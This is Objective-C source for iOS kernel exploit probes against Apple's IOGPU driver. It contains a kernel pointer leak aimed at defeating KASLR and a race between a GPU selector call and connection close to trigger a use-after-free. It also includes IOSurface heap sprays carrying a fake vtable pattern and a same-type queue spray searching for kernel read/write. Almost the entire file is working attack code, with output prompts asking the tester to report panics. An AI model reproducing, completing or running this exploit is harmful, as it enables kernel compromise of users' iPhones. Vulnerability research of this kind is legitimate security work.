    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    if (!pDevCreate || !pGetConn || !pQueueCreate) {
        [out appendString:@"STOP: missing IOGPU symbols\n"];
        return out;
    }

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP: no IOGPU service\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n\n", svc];

    // Create device and queue
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP: no device\n"]; return out; }
    io_connect_t conn = pGetConn(dev);

    // sel=7: create queue with structIn=0x408
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);

    // sel=7 output: 0x10 bytes = {qid (u32), *(queue+0x550) (u64)}
    uint64_t structOut[2] = {0};
    uint32_t structOutSize = 0x10;
    uint64_t scalarIn[1] = {0};
    uint32_t scalarInCount = 0;

    kern_return_t r = pCall(conn, 6, scalarIn, scalarInCount, args, 0x410,
                            structOut, &structOutSize, NULL, NULL);
    free(args);

    [out appendFormat:@"sel=7 result: 0x%08x\n", (unsigned)r];
    if (r == KERN_SUCCESS) {
        uint32_t qid = (uint32_t)structOut[0];
        uint64_t leak = structOut[1];
        [out appendFormat:@"qid: %u\n", qid];
        [out appendFormat:@"*(queue+0x550): 0x%016llx\n", leak];

        // Check if it looks like a kernel pointer
        if ((leak >> 48) == 0xFFFF || (leak >> 48) == 0xFFFE) {
            [out appendString:@"\n*** KERNEL POINTER LEAKED ***\n"];
            [out appendFormat:@"KASLR slide candidate: 0x%016llx\n", leak];
            // The static offset of the helper object depends on the
            // AGXCommandQueue size and the per-queue helper offset.
            // On 22H311 (A12), the helper was at queue+0x550.
            // On 27b4 (A18 Pro), need to find the actual offset.
        } else {
            [out appendString:@"\nNot pointer-shaped — may be truncated or conditional.\n"];
            [out appendString:@"On 22H311, observed {2, 0x48096c8f} — not pointer-shaped.\n"];
        }
    } else {
        [out appendFormat:@"sel=7 failed: 0x%08x\n", (unsigned)r];
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    pRelease(svc);
    return out;
}
// ==== END P010IOS27.inc.h ====

// ==== BEGIN inlined P010KRWv2.inc.h ====
// P010 KRW v2: async sel=16 vs IOServiceClose + IOSurface heap spray
// Fixed: uses IOSurface for kernel heap spray (no mach queue limit)
// IOSurfaceCreate allocates kernel memory directly — kalloc.288 per surface
// Now includes P009 GetGPUVirtualAddress to leak kernel base (KASLR bypass)

// Static helper: extract resourceRef from Metal buffer (file scope, not inside function)
static void *p010_getResourceRef(id buf) {
    if (!buf) return NULL;
    // Unwrap Capture/Debug proxies first, then read resourceRef
    for (int i = 0; i < 8; i++) {
        NSString *cn = NSStringFromClass([buf class]);
        if (![cn containsString:@"Capture"] && ![cn containsString:@"Debug"]) break;
        SEL sel = NSSelectorFromString(@"baseObject");
        if (![buf respondsToSelector:sel]) break;
        id base = ((id (*)(id, SEL))objc_msgSend)(buf, sel);
        if (!base || base == buf) break;
        buf = base;
    }
    SEL sel = NSSelectorFromString(@"resourceRef");
    if (![buf respondsToSelector:sel]) return NULL;
    return ((void *(*)(id, SEL))objc_msgSend)(buf, sel);
}

+ (NSString *)runP010KRWv2 {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010krwv2"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"=== P010 KRW v2 — race + IOSurface spray + KASLR leak ===\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) {
        [out appendFormat:@"STOP: iokit=%p iogpu=%p\n", iokit, iogpu];
        return out;
    }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOServiceClose_t pClose = dlsym(iokit, "IOServiceClose");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef kern_return_t (*IOConnectCallAsyncMethod_t)(
        mach_port_t, uint32_t, mach_port_t,
        uint64_t *, uint32_t,
        const uint64_t *, uint32_t,
        const void *, size_t,
        uint64_t *, uint32_t *,
        void *, size_t *);
    IOConnectCallAsyncMethod_t pAsyncCall =
        (IOConnectCallAsyncMethod_t)dlsym(iokit, "IOConnectCallAsyncMethod");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = (DevCreate_t)dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = (GetConn_t)dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = (DevRelease_t)dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = (QueueCreate_t)dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = (QueueGetID_t)dlsym(iogpu, "IOGPUCommandQueueGetID");

    if (!pDevCreate || !pGetConn || !pQueueCreate) {
        [out appendString:@"STOP: missing symbols\n"];
        return out;
    }

    // NOTE: IOGPUResourceGetGPUVirtualAddress returns a GPU-VA (e.g.
    // 0x15_00000000), NOT a kernel VA. It cannot leak the KASLR slide.
    // Do not add "kernel base estimation" from it — the spaces are unrelated.
    typedef uint64_t (*GetGPUVA_t)(void *);
    GetGPUVA_t pGetGPUVA = (GetGPUVA_t)dlsym(iogpu, "IOGPUResourceGetGPUVirtualAddress");

    // IOSurface functions
    void *iosurface = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    typedef CFMutableDictionaryRef (*IOSurfaceCreate_t)(CFDictionaryRef);
    IOSurfaceCreate_t pIOSurfaceCreate = iosurface ? dlsym(iosurface, "IOSurfaceCreate") : NULL;
    typedef kern_return_t (*IOSurfaceSetValue_t)(CFMutableDictionaryRef, CFStringRef, CFTypeRef);
    IOSurfaceSetValue_t pIOSurfaceSetValue = iosurface ? dlsym(iosurface, "IOSurfaceSetValue") : NULL;
    // Pixel-buffer write path: the 0x120 data allocation is what actually
    // reclaims the freed slot — SetValue props live in a separate OSData.
    typedef void *(*IOSurfaceGetBaseAddress_t)(CFMutableDictionaryRef);
    IOSurfaceGetBaseAddress_t pIOSurfaceGetBase = iosurface ? dlsym(iosurface, "IOSurfaceGetBaseAddress") : NULL;
    typedef kern_return_t (*IOSurfaceLock_t)(CFMutableDictionaryRef, uint32_t, uint32_t *);
    IOSurfaceLock_t pIOSurfaceLock = iosurface ? dlsym(iosurface, "IOSurfaceLock") : NULL;
    typedef kern_return_t (*IOSurfaceUnlock_t)(CFMutableDictionaryRef, uint32_t, uint32_t *);
    IOSurfaceUnlock_t pIOSurfaceUnlock = iosurface ? dlsym(iosurface, "IOSurfaceUnlock") : NULL;

    if (!pIOSurfaceCreate) {
        [out appendString:@"WARN: no IOSurfaceCreate — using mach msg spray (limited)\n"];
    }

    CFMutableDictionaryRef m = pMatching("IOGPU");
    io_service_t svc = m ? pGet(*pMainPort, m) : 0;
    if (!svc) { [out appendString:@"STOP: no IOGPU service\n"]; return out; }
    [out appendFormat:@"IOGPU service=%u\n", svc];

    // === Step 2: IOSurface Spray with controlled data ===
    // Each IOSurfaceCreate allocates a kernel IOSurface object.
    // We use IOSurfaceSetValue to set user data in the kernel object.
    // The user data is stored in the kernel object's property dictionary.
    // If we can control the property dictionary, we control what's at the freed object.
    //
    // The IOGPU device object is at UC+0x120. When freed, the memory is not zeroed.
    // If we spray IOSurfaces with controlled data, we can reclaim the freed slot.
    //
    // Strategy: Set a fake vtable pointer in the IOSurface user data.
    // The vtable pointer should point to a controlled address with a fake vtable.
    // Since we don't know the kernel base (KASLR), we use a pattern that's easy to recognize.
    //
    // Pattern: 0x4141414141414141 (fake vtable pointer)
    // If the kernel tries to call a method on the fake object, it will jump to 0x4141414141414141
    // and crash. This confirms the spray is landing.
    #define SURFACE_COUNT 2000
    #define FAKE_VTABLE 0x4141414141414141ULL

    // Create IOSurface with controlled data
    CFMutableDictionaryRef surfProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);

    // Small surface: 1x1 pixel, 32-bit RGBA
    int32_t w = 1, h = 1, bpp = 4, bpr = 4;
    CFNumberRef wNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &w);
    CFNumberRef hNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &h);
    CFNumberRef bppNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bpp);
    CFNumberRef bprNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &bpr);

    // IOSurface property keys (from IOSurface.framework)
    CFStringRef kWidth = CFSTR("IOSurfaceWidth");
    CFStringRef kHeight = CFSTR("IOSurfaceHeight");
    CFStringRef kBytesPerElem = CFSTR("IOSurfaceBytesPerElement");
    CFStringRef kBytesPerRow = CFSTR("IOSurfaceBytesPerRow");
    CFStringRef kAllocSize = CFSTR("IOSurfaceAllocSize");

    int32_t allocSize = 0x120; // Match GPU device object size
    CFNumberRef allocNum = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt32Type, &allocSize);

    CFDictionarySetValue(surfProps, kWidth, wNum);
    CFDictionarySetValue(surfProps, kHeight, hNum);
    CFDictionarySetValue(surfProps, kBytesPerElem, bppNum);
    CFDictionarySetValue(surfProps, kBytesPerRow, bprNum);
    CFDictionarySetValue(surfProps, kAllocSize, allocNum);

    CFRelease(wNum); CFRelease(hNum); CFRelease(bppNum); CFRelease(bprNum); CFRelease(allocNum);

    [out appendFormat:@"IOSurface spray: %d surfaces, allocSize=0x%x, fake_vtable=0x%llx\n",
        SURFACE_COUNT, allocSize, FAKE_VTABLE];

    // Pre-allocate IOSurface array
    CFMutableArrayRef surfaces = CFArrayCreateMutable(kCFAllocatorDefault, SURFACE_COUNT, &kCFTypeArrayCallBacks);

    // === Main loop: race sel=16 vs close+spray ===
    int tcHits = 0;
    int tcSurvived = 0;
    int N = 50;

    for (int iter = 0; iter < N; iter++) {
        void *devA = pDevCreate(svc);
        void *devB = pDevCreate(svc);
        if (!devA || !devB) {
            if (devA) pDevRelease(devA);
            if (devB) pDevRelease(devB);
            continue;
        }
        io_connect_t connA = pGetConn(devA);
        io_connect_t connB = pGetConn(devB);

        void *argsA = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)argsA + 0x400) = *(uint32_t *)((uint8_t *)devA + 0x08);
        *(uint8_t *)((uint8_t *)argsA + 0x404) = *(uint8_t *)((uint8_t *)devA + 0x08);
        void *qA = pQueueCreate(devA, argsA, 0x410);
        free(argsA);
        uint32_t qidA = pGetID ? pGetID(qA) : 1;

        if (iter == 0) {
            [out appendFormat:@"iter0: connA=%u connB=%u qidA=%u\n", connA, connB, qidA];
        }

        __block volatile int go = 0;
        __block volatile int useOk = 0;
        __block volatile int useFail = 0;
        __block kern_return_t closeRc = -1;
        __block volatile int sprayCount = 0;

        dispatch_group_t grp = dispatch_group_create();
        dispatch_queue_t qUse = dispatch_queue_create("p010.use", NULL);
        dispatch_queue_t qClose = dispatch_queue_create("p010.close", NULL);

        // Thread 1: sel=16 on connA in tight loop
        dispatch_group_async(grp, qUse, ^{
            while (!go) {}
            uint64_t s[1] = {qidA};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(connA, 16, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) useOk++;
                else useFail++;
                if (r == 0x10000003) break;
            }
        });

        // Thread 2: close connB + IOSurface spray
        dispatch_group_async(grp, qClose, ^{
            while (!go) {}
            for (volatile int i = 0; i < 50; i++) {}
            closeRc = pClose(connB);

            // Spray IOSurfaces to reclaim freed memory.
            // Drain last iteration's surfaces first or the per-process
            // IOSurface quota dies mid-loop (that was the spray=0 cause).
            CFArrayRemoveAllValues(surfaces);
            if (pIOSurfaceCreate) {
                for (int s = 0; s < SURFACE_COUNT; s++) {
                    CFMutableDictionaryRef surf = pIOSurfaceCreate(surfProps);
                    if (surf) {
                        // 1) Fill the 0x120 PIXEL BUFFER with the pattern —
                        //    this allocation is what reclaims the freed slot.
                        if (pIOSurfaceGetBase && pIOSurfaceLock && pIOSurfaceUnlock) {
                            if (pIOSurfaceLock(surf, 0, NULL) == 0) {
                                void *base = pIOSurfaceGetBase(surf);
                                if (base) memset(base, 0x41, 0x120);
                                pIOSurfaceUnlock(surf, 0, NULL);
                            }
                        }
                        // 2) Property too (kept; lands in a separate OSData)
                        if (pIOSurfaceSetValue) {
                            uint64_t fakeVtable = FAKE_VTABLE;
                            CFDataRef vtableData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&fakeVtable, sizeof(fakeVtable));
                            pIOSurfaceSetValue(surf, CFSTR("FakeVTable"), vtableData);
                            CFRelease(vtableData);
                        }
                        CFArrayAppendValue(surfaces, surf);
                        sprayCount++;
                    }
                }
            }
        });

        go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        if (iter == 0) {
            [out appendFormat:@"iter0: use_ok=%d use_fail=%d close=0x%08x spray=%d\n",
                useOk, useFail, (unsigned)closeRc, sprayCount];
            if (sprayCount == 0) {
                CFMutableDictionaryRef probe = pIOSurfaceCreate ? pIOSurfaceCreate(surfProps) : NULL;
                [out appendFormat:@"*** SPRAY FAILED on iter0 (pIOSurfaceCreate=%p, main-thread probe=%p) — UAF ran WITHOUT controlled reclaim; hits are incidental ***\n",
                    (void *)pIOSurfaceCreate, (void *)probe];
                if (probe) CFRelease(probe);
            }
        }

        if (closeRc == KERN_SUCCESS && useOk > 0) {
            tcHits++;
        } else {
            tcSurvived++;
        }

        if (pDevRelease) { pDevRelease(devA); pDevRelease(devB); }
    }

    [out appendFormat:@"\ntwo-conn+IOSurface spray: N=%d hits=%d survived=%d\n", N, tcHits, tcSurvived];
    [out appendString:@"panic = UAF + spray landed. survived = spray missed freed object.\n"];

    // === Step 2: Same-conn race + IOSurface spray ===
    [out appendString:@"\n=== Same-conn race + IOSurface spray ===\n"];
    int scHits = 0;
    int scSurvived = 0;

    // Clear surfaces for fresh spray, then give the kernel's deferred IOSurface
    // teardown a moment — otherwise the two-conn storm's quota lag makes every
    // create here fail (the observed same-conn spray=0).
    CFRelease(surfaces);
    surfaces = CFArrayCreateMutable(kCFAllocatorDefault, SURFACE_COUNT, &kCFTypeArrayCallBacks);
    usleep(300000);

    for (int iter = 0; iter < N; iter++) {
        void *dev = pDevCreate(svc);
        if (!dev) continue;
        io_connect_t conn = pGetConn(dev);

        void *args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        uint32_t qid = pGetID ? pGetID(q) : 1;

            __block volatile int go = 0;
        __block volatile int useOk = 0;
        __block volatile int useFail = 0;
        __block kern_return_t closeRc = -1;
        __block volatile int sprayCount = 0;

        dispatch_group_t grp = dispatch_group_create();
        dispatch_queue_t qUse = dispatch_queue_create("p010.use", NULL);
        dispatch_queue_t qClose = dispatch_queue_create("p010.close", NULL);

        // Thread 1: sel=16 on conn in tight loop
        dispatch_group_async(grp, qUse, ^{
                while (!go) {}
            uint64_t s[1] = {qid};
            for (int i = 0; i < 50000; i++) {
                kern_return_t r = pCall(conn, 16, s, 1, NULL, 0, NULL, NULL, NULL, NULL);
                if (r == 0) useOk++;
                else useFail++;
                if (r == 0x10000003) break;
            }
        });

        // Thread 2: close conn + IOSurface spray
        dispatch_group_async(grp, qClose, ^{
                while (!go) {}
            for (volatile int i = 0; i < 50; i++) {}
            closeRc = pClose(conn);

            CFArrayRemoveAllValues(surfaces);
            if (pIOSurfaceCreate) {
                for (int s = 0; s < SURFACE_COUNT; s++) {
                    CFMutableDictionaryRef surf = pIOSurfaceCreate(surfProps);
                    if (surf) {
                        if (pIOSurfaceGetBase && pIOSurfaceLock && pIOSurfaceUnlock) {
                            if (pIOSurfaceLock(surf, 0, NULL) == 0) {
                                void *base = pIOSurfaceGetBase(surf);
                                if (base) memset(base, 0x41, 0x120);
                                pIOSurfaceUnlock(surf, 0, NULL);
                            }
                        }
                        if (pIOSurfaceSetValue) {
                            uint64_t fakeVtable = FAKE_VTABLE;
                            CFDataRef vtableData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&fakeVtable, sizeof(fakeVtable));
                            pIOSurfaceSetValue(surf, CFSTR("FakeVTable"), vtableData);
                            CFRelease(vtableData);
                        }
                        CFArrayAppendValue(surfaces, surf);
                        sprayCount++;
                    }
                }
            }
            });

            go = 1;
        dispatch_group_wait(grp, DISPATCH_TIME_FOREVER);

        if (iter == 0) {
            [out appendFormat:@"sc iter0: use_ok=%d close=0x%08x spray=%d\n",
                useOk, (unsigned)closeRc, sprayCount];
        }

        if (closeRc == KERN_SUCCESS && useOk > 0) {
            scHits++;
        } else {
            scSurvived++;
        }

        if (pDevRelease) pDevRelease(dev);
    }

    [out appendFormat:@"same-conn+spray: N=%d hits=%d survived=%d\n", N, scHits, scSurvived];

    // === Step 3: Async race + IOSurface spray ===
    [out appendString:@"\n=== Async race + IOSurface spray ===\n"];

    // Clear surfaces for fresh spray
    CFRelease(surfaces);
    surfaces = CFArrayCreateMutable(kCFAllocatorDefault, SURFACE_COUNT, &kCFTypeArrayCallBacks);

    void *dev = pDevCreate(svc);
    if (dev) {
        io_connect_t conn = pGetConn(dev);

        void *args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        uint32_t qid = pGetID ? pGetID(q) : 1;

        // Create a mach port for async notification
        mach_port_t wakePort = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);

        // Async sel=16
        uint64_t sc[1] = {qid};
        uint64_t outSc[8] = {0};
        uint32_t outCnt = 8;
        kern_return_t ar = pAsyncCall(conn, 16, wakePort, NULL, 0, sc, 1, NULL, 0, outSc, &outCnt, NULL, NULL);
        [out appendFormat:@"async sel=16 -> 0x%08x\n", (unsigned)ar];

        // Close conn
        kern_return_t cr = pClose(conn);
        [out appendFormat:@"close -> 0x%08x\n", (unsigned)cr];

        // Spray IOSurfaces to reclaim freed memory (drain prior phase's
        // surfaces first — same quota fix as the race paths)
        CFArrayRemoveAllValues(surfaces);
        usleep(300000);
        int sprayed = 0;
        if (pIOSurfaceCreate) {
            for (int s = 0; s < SURFACE_COUNT; s++) {
                CFMutableDictionaryRef surf = pIOSurfaceCreate(surfProps);
                if (surf) {
                    if (pIOSurfaceGetBase && pIOSurfaceLock && pIOSurfaceUnlock) {
                        if (pIOSurfaceLock(surf, 0, NULL) == 0) {
                            void *base = pIOSurfaceGetBase(surf);
                            if (base) memset(base, 0x41, 0x120);
                            pIOSurfaceUnlock(surf, 0, NULL);
                        }
                    }
                    if (pIOSurfaceSetValue) {
                        uint64_t fakeVtable = FAKE_VTABLE;
                        CFDataRef vtableData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)&fakeVtable, sizeof(fakeVtable));
                        pIOSurfaceSetValue(surf, CFSTR("FakeVTable"), vtableData);
                        CFRelease(vtableData);
                    }
                    CFArrayAppendValue(surfaces, surf);
                    sprayed++;
                }
            }
        }
        [out appendFormat:@"IOSurface spray=%d\n", sprayed];

        // Wait for async result
        mach_msg_header_t msg = {0};
        kern_return_t wr = mach_msg(&msg, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(msg), wakePort, 1000, MACH_PORT_NULL);
        [out appendFormat:@"async wake: 0x%08x\n", (unsigned)wr];

        mach_port_deallocate(mach_task_self(), wakePort);
        if (pDevRelease) pDevRelease(dev);
    }

    [out appendString:@"\nDONE -- paste this text back\n"];
    [out appendString:@"panic = UAF + spray landed. survived = increase N or surface count.\n"];

    CFRelease(surfaces);
    CFRelease(surfProps);
    pRelease(svc);
    return out;
}
// ==== END P010KRWv2.inc.h ====

// ==== BEGIN inlined P010QueueSpray.inc.h ====
// P010 same-type reclaim — 18.7.5 (22H311)
//
// IOSurface spray cannot reclaim AGXCommandQueue (kalloc_type). This probe
// sprays IOGPUCommandQueueCreate on the SAME live device after sel=8 destroy.
//
// Honest expectations (research/p010_krw_findings.md, queue_uaf_paths_22H311.md):
//   - New queues are REAL AGXCommandQueue objects, not fake vtables.
//   - qid is a raw slot index; old qid resolving after spray = SLOT REUSE, not KRW.
//   - memcpy +0x10..0x410 is inert (no method reads it). 0x42 fill must NOT panic.
//   - Remaining lead: structIn+0x400 (must be <=4) -> queue+0x450, trusted by
//     AGX vt+0xf8/vt+0xc0 as a small index. Sweep submit-like sels with 0..4.
//
// Real signals: panic; 0x42 appearing in structOut; kr other than BadArgument
// on the +0x450 sweep. "sel=16 returned 0" is NOT a UAF hit.

+ (NSString *)runP010QueueSpray {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010qspray"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *lp = [docs stringByAppendingPathComponent:@"p010_queuespray.txt"];
    int fd = open([lp UTF8String], O_CREAT | O_TRUNC | O_WRONLY, 0644);
    #define QSLOG(...) do { \
        NSString *_l = [NSString stringWithFormat:__VA_ARGS__]; \
        [out appendString:_l]; [out appendString:@"\n"]; \
        if (fd >= 0) { const char *_s = [_l UTF8String]; write(fd, _s, strlen(_s)); write(fd, "\n", 1); fcntl(fd, F_FULLFSYNC); } \
    } while (0)

    QSLOG(@"time %@", [NSDate date]);
    QSLOG(@"=== P010 same-type queue spray (18.7.5) ===");
    QSLOG(@"Not IOSurface. Device stays open. sel=8 destroy, then IOGPUCommandQueueCreate.");
    QSLOG(@"Panic = unexpected. sel=16 OK after spray = slot reuse (NOT KRW).");

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    if (!iokit || !iogpu) { QSLOG(@"STOP dlopen"); if (fd>=0) close(fd); return out; }

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef uint32_t (*QueueGetConn_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueGetConn_t pQueueGetConn = dlsym(iogpu, "IOGPUCommandQueueGetConnect");
    if (!pMatching || !pGet || !pCall || !pMainPort || !pDevCreate || !pGetConn || !pQueueCreate) {
        QSLOG(@"STOP dlsym"); if (fd>=0) close(fd); return out;
    }

    io_service_t svc = pGet(*pMainPort, pMatching("IOGPU"));
    if (!svc) { QSLOG(@"STOP no IOGPU"); if (fd>=0) close(fd); return out; }
    QSLOG(@"IOGPU service=%u", svc);

    void *dev = pDevCreate(svc);
    if (!dev) { QSLOG(@"STOP DeviceCreate"); pRelease(svc); if (fd>=0) close(fd); return out; }
    io_connect_t conn = pGetConn(dev);
    QSLOG(@"dev=%p conn=%u type_id@+8=0x%x", dev, conn, *(uint32_t *)((uint8_t *)dev + 0x08));

    QSLOG(@"CHK live +0x450 index sweep (structIn+0x400 = 0..5)");

    static const uint32_t kProbeSels[] = { 7, 9, 15, 17, 18, 19, 20, 21, 22, 25, 26, 33, 42, 45 };
    static const int kNProbeSels = (int)(sizeof(kProbeSels)/sizeof(kProbeSels[0]));

    for (uint32_t mode = 0; mode <= 5; mode++) {
        void *args = calloc(1, 0x410);
        memset((uint8_t *)args + 0x10, 0x42, 0x3f0);
        *(uint32_t *)((uint8_t *)args + 0x400) = mode;
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        uint32_t qid = 0;
        if (q && pGetID) qid = pGetID(q);
        else if (q) qid = (uint32_t)(*(uint64_t *)((uint8_t *)q + 0x18));
        QSLOG(@"  mode=%u q=%p qid=%u%s", mode, q, qid, mode > 4 ? @" (OVER-LIMIT, expect fail)" : @"");
        if (!q) { free(args); continue; }

        for (int si = 0; si < kNProbeSels; si++) {
            uint32_t sel = kProbeSels[si];
            uint64_t sc[1] = {qid};
            uint8_t so[0x40]; memset(so, 0, sizeof(so));
            size_t sos = sizeof(so);
            uint64_t osc[4] = {0}; uint32_t oscn = 4;
            kern_return_t r;
            if (sel == 6) {
                size_t inSz = 0x410;
                r = pCall(conn, 6, NULL, 0, args, inSz, osc, &oscn, so, &sos);
            } else {
                r = pCall(conn, sel, sc, 1, NULL, 0, osc, &oscn, so, &sos);
            }
            if (r == 0 || ((unsigned)r != 0xe00002c2 && (unsigned)r != 0xe00002cc && (unsigned)r != 0xe00002bc)) {
                QSLOG(@"    sel=%u mode=%u -> 0x%08x oscn=%u sos=%zu osc0=0x%llx so0=0x%llx",
                      sel, mode, (unsigned)r, oscn, sos, osc[0], *(uint64_t *)so);
            }
        }
        free(args);
    }

    QSLOG(@"CHK destroy+same-type spray");
    void *argsA = calloc(1, 0x410);
    memset((uint8_t *)argsA + 0x10, 0x41, 0x3f0);
    *(uint32_t *)((uint8_t *)argsA + 0x400) = 0;
    *(uint8_t *)((uint8_t *)argsA + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *qA = pQueueCreate(dev, argsA, 0x410);
    uint32_t qidA = (qA && pGetID) ? pGetID(qA) : (qA ? (uint32_t)(*(uint64_t *)((uint8_t *)qA + 0x18)) : 0);
    uint32_t qConnA = (qA && pQueueGetConn) ? pQueueGetConn(qA) : 0;
    QSLOG(@"queueA qid=%u qConn=%u", qidA, qConnA);

    uint64_t sc8[1] = {qidA};
    kern_return_t dr;
    if (qConnA) dr = pCall(qConnA, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
    else dr = pCall(conn, 8, sc8, 1, NULL, 0, NULL, NULL, NULL, NULL);
    QSLOG(@"sel=8 destroy -> 0x%08x", (unsigned)dr);

    uint64_t sc16[1] = {qidA};
    kern_return_t r16pre = pCall(conn, 16, sc16, 1, NULL, 0, NULL, NULL, NULL, NULL);
    QSLOG(@"sel=16 on old qid BEFORE spray -> 0x%08x", (unsigned)r16pre);

    enum { kSpray = 64 };
    uint32_t sprayQids[kSpray];
    int nSpray = 0;
    void *keepQ[kSpray];
    for (int i = 0; i < kSpray; i++) {
        void *args = calloc(1, 0x410);
        memset((uint8_t *)args + 0x10, 0x42, 0x3f0);
        *(uint32_t *)((uint8_t *)args + 0x400) = 3;
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) continue;
        keepQ[nSpray] = q;
        sprayQids[nSpray] = pGetID ? pGetID(q) : (uint32_t)(*(uint64_t *)((uint8_t *)q + 0x18));
        nSpray++;
    }
    QSLOG(@"spray created %d/%d queues (kept live)", nSpray, kSpray);
    int reused = 0;
    for (int i = 0; i < nSpray; i++) if (sprayQids[i] == qidA) reused++;
    if (nSpray > 0) {
        QSLOG(@"spray qid[0]=%u qid[last]=%u old_qid=%u reused_slot_count=%d",
              sprayQids[0], sprayQids[nSpray-1], qidA, reused);
    }

